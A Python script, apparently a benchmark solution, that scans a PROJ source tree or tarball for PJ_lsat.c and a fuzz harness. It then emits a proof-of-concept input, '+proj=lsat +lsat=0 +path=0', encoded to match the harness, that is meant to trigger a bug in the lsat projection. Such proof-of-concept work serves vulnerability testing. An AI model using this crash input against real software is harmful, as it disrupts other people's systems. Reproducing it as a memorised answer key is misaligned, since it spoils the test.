import os
import re
import tarfile
from typing import Iterable, List, Optional, Tuple


class Solution:
    def _read_file_text(self, path: str, limit: int = 1_000_000) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read(limit)
            return data.decode("utf-8", "ignore")
        except Exception:
            try:
                with open(path, "rb") as f:
                    data = f.read(limit)
                return data.decode("latin-1", "ignore")
            except Exception:
                return ""

    def _iter_dir_files(self, root: str) -> Iterable[str]:
        for base, _, files in os.walk(root):
            for fn in files:
                yield os.path.join(base, fn)

    def _find_pj_lsat_text_in_dir(self, root: str) -> str:
        for p in self._iter_dir_files(root):
            if p.endswith(os.sep + "PJ_lsat.c") or p.endswith("/PJ_lsat.c") or p.endswith("\\PJ_lsat.c") or p.endswith("PJ_lsat.c"):
                return self._read_file_text(p)
        return ""

    def _find_harness_text_in_dir(self, root: str) -> str:
        best = ""
        best_score = -1

        for p in self._iter_dir_files(root):
            low = p.lower()
            if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx")):
                continue
            try:
                sz = os.path.getsize(p)
                if sz > 1_500_000:
                    continue
            except Exception:
                continue

            text = self._read_file_text(p, limit=500_000)
            if not text:
                continue

            score = 0
            if "LLVMFuzzerTestOneInput" in text:
                score += 100
            if "FuzzedDataProvider" in text:
                score += 30
            if "proj_create" in text or "pj_init_plus" in text:
                score += 20
            if "stdin" in text or "fread" in text or "read(" in text:
                score += 10
            if "fuzz" in low or "poc" in low or "driver" in low or "harness" in low:
                score += 5

            if score > best_score:
                best_score = score
                best = text

            if best_score >= 120:
                break

        return best

    def _tar_iter_text_members(self, tf: tarfile.TarFile) -> Iterable[tarfile.TarInfo]:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name.lower()
            if name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx"):
                if m.size <= 1_500_000:
                    yield m

    def _tar_read_member_text(self, tf: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 1_000_000) -> str:
        try:
            f = tf.extractfile(m)
            if not f:
                return ""
            data = f.read(limit)
            try:
                return data.decode("utf-8", "ignore")
            except Exception:
                return data.decode("latin-1", "ignore")
        except Exception:
            return ""

    def _find_pj_lsat_text_in_tar(self, tf: tarfile.TarFile) -> str:
        candidates: List[tarfile.TarInfo] = []
        for m in tf.getmembers():
            if m.isreg() and (m.name.endswith("PJ_lsat.c") or m.name.endswith("/PJ_lsat.c") or m.name.endswith("\\PJ_lsat.c")):
                candidates.append(m)
        if not candidates:
            for m in tf.getmembers():
                if m.isreg() and m.name.lower().endswith("pj_lsat.c"):
                    candidates.append(m)
        if not candidates:
            return ""
        candidates.sort(key=lambda x: (len(x.name), x.size))
        return self._tar_read_member_text(tf, candidates[0], limit=1_200_000)

    def _find_harness_text_in_tar(self, tf: tarfile.TarFile) -> str:
        best = ""
        best_score = -1
        for m in self._tar_iter_text_members(tf):
            low = m.name.lower()
            text = self._tar_read_member_text(tf, m, limit=500_000)
            if not text:
                continue

            score = 0
            if "LLVMFuzzerTestOneInput" in text:
                score += 100
            if "FuzzedDataProvider" in text:
                score += 30
            if "proj_create" in text or "pj_init_plus" in text:
                score += 20
            if "stdin" in text or "fread" in text or "read(" in text:
                score += 10
            if "fuzz" in low or "poc" in low or "driver" in low or "harness" in low:
                score += 5

            if score > best_score:
                best_score = score
                best = text

            if best_score >= 120:
                break
        return best

    def _extract_param_names_from_lsat(self, lsat_text: str) -> Tuple[Optional[str], Optional[str]]:
        if not lsat_text:
            return None, None

        tokens = re.findall(r'pj_param\s*\(\s*.*?,\s*"([^"]+)"\s*\)', lsat_text, flags=re.S)
        names: List[Tuple[str, str]] = []
        for t in tokens:
            if len(t) >= 2 and t[0].isalpha() and re.fullmatch(r"[A-Za-z][A-Za-z0-9_]*", t):
                names.append((t[0].lower(), t[1:].lower()))

        all_names = {n for _, n in names}

        def pick(prefer: List[str]) -> Optional[str]:
            for p in prefer:
                if p in all_names:
                    return p
            for _, n in names:
                for p in prefer:
                    if p in n:
                        return n
            return None

        lsat_key = pick(["lsat", "sat", "satnum", "satellite"])
        path_key = pick(["path", "lsatpath", "track", "row", "scene"])

        if lsat_key == "proj" or lsat_key == "ellps":
            lsat_key = None
        if path_key == "proj" or path_key == "ellps":
            path_key = None

        return lsat_key, path_key

    def _build_bad_proj_string(self, lsat_text: str) -> bytes:
        lsat_key, path_key = self._extract_param_names_from_lsat(lsat_text)

        if not lsat_key:
            lsat_key = "lsat"
        if not path_key:
            path_key = "path"

        s = f"+proj=lsat +{lsat_key}=0 +{path_key}=0"
        return s.encode("ascii", "ignore")

    def _harness_uses_fdp(self, harness_text: str) -> bool:
        return "FuzzedDataProvider" in harness_text

    def _harness_needs_two_strings(self, harness_text: str) -> bool:
        ht = harness_text
        if not ht:
            return False
        if "proj_create_crs_to_crs" in ht or "proj_create_crs_to_crs_from_pj" in ht:
            return True
        if ht.count("proj_create(") >= 2:
            return True
        if ht.count("ConsumeRandomLengthString") >= 2:
            return True
        if ht.count("ConsumeRemainingBytesAsString") >= 2:
            return True

        # Heuristic for newline-split two-line input
        if "strtok" in ht and ('"\\n"' in ht or '"\\r\\n"' in ht):
            return True
        if "std::getline" in ht and ht.count("std::getline") >= 2:
            return True
        return False

    def _harness_looks_newline_split(self, harness_text: str) -> bool:
        ht = harness_text
        if not ht:
            return False
        if "strtok" in ht and ('"\\n"' in ht or '"\\r\\n"' in ht):
            return True
        if "std::getline" in ht:
            return True
        if "\\n" in ht and ("split" in ht or "getline" in ht):
            return True
        return False

    def _encode_fdp_random_length_strings(self, strings: List[bytes]) -> bytes:
        out = bytearray()
        for s in strings:
            L = len(s)
            out += int(L).to_bytes(8, "little", signed=False)
            out += s
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        lsat_text = ""
        harness_text = ""

        if os.path.isdir(src_path):
            lsat_text = self._find_pj_lsat_text_in_dir(src_path)
            harness_text = self._find_harness_text_in_dir(src_path)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    lsat_text = self._find_pj_lsat_text_in_tar(tf)
                with tarfile.open(src_path, "r:*") as tf:
                    harness_text = self._find_harness_text_in_tar(tf)
            except Exception:
                lsat_text = ""
                harness_text = ""

        bad = self._build_bad_proj_string(lsat_text)
        good = b"+proj=longlat"

        if harness_text:
            if self._harness_uses_fdp(harness_text):
                if self._harness_needs_two_strings(harness_text):
                    return self._encode_fdp_random_length_strings([bad, good])
                return self._encode_fdp_random_length_strings([bad])
            else:
                if self._harness_needs_two_strings(harness_text) and self._harness_looks_newline_split(harness_text):
                    return bad + b"\n" + good

        return bad